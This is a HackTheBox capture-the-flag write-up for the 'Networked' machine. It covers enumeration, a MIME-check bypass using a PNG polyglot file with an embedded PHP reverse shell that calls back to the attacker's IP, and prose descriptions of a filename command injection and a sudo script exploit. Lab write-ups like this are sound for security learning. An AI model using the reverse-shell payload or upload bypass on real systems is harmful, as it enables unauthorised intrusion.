
# 🚩 Networked - Write-up

![Banner](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/1-banner.png)

## 📝 General Information
| Attribute | Details |
| :--- | :--- |
| **Platform** | HackTheBox |
| **Category** | Web Application - Injections - Source Code Analysis |
| **Difficulty** | 🟢 Easy |
| **OS** | 🐧 Linux |
| **Date** | 2026-04-28 |

---

## 🎯 Executive Summary
*On Networked, The breach is began with a MIME-type bypass using a crafted Polyglot PNG to crack open the web layer for an initial foothold. The momentum shifted to a stealthy horizontal pivot, weaponizing a Command Injection via a filename to hijack a vulnerable Cronjob and seize control of the user guly. The final strike was a clinical exploitation of a root-level bash script, where a misconfigured network variable was the key to shattering the system's last defense and claiming the ROOT throne! 🚩*

---

## 🛠️ Tools Used
* **Enumeration:** `Nmap`, `Gobuster`, `FFUF`
* **Exploitation:** `Burp Suite`, `Exiftool`
* **Post-Exploitation:** `nc`, `python3`, `stty`

---

## 🔍 Phase 1: Enumeration & Reconnaissance

### 1. Port Scanning
```bash
sudo nmap -sV -sC -A -T4 <Target_IP>
Findings:

Port 80 (HTTP): Apache 2.4.6

Port 22 (SSH): OpenSSH 7.4

2. Directory Brute-forcing
Bash
gobuster dir -u http://<Target_IP> -w /usr/share/wordlists/dirb/common.txt
[!IMPORTANT]

Discovered /uploads/ and /lib.php which gave a hint about the file upload logic.

🚀 Phase 2: Initial Access (Exploitation)
Vulnerability: [e.g., Insecure File Upload]
The source code revealed that it only checks for MIME Type and IP-based filenames.

Steps to Exploit:

Created a PNG polyglot file using printf.

Embedded a PHP reverse shell payload.

Named the file 10_10_14_34.php.png to bypass the regex check.

Bash
printf "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a" > 10_10_14_34.php.png
echo '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.34/9000 0>&1\""); ?>' >> 10_10_14_34.php.png
🛡️ Phase 3: Privilege Escalation
User: [Username]
Found a cronjob running a script named check_attack.php every 3 minutes.

Vulnerability: Command Injection via filename in exec() function.

Action: Created a file with a semicolon in its name to trigger the injection.

Root
Checked sudo permissions: sudo -l.

Binary: /usr/local/sbin/changename.sh

Exploit: Injected /bin/bash through the BOOTPROTO variable.

🏁 Conclusion & Mitigation
User Flag: ********************************

Root Flag: ********************************

Lessons Learned:
Always sanitize user input in system-level scripts.

Implement strict extension whitelisting for file uploads.

Created with 💜 by Reef
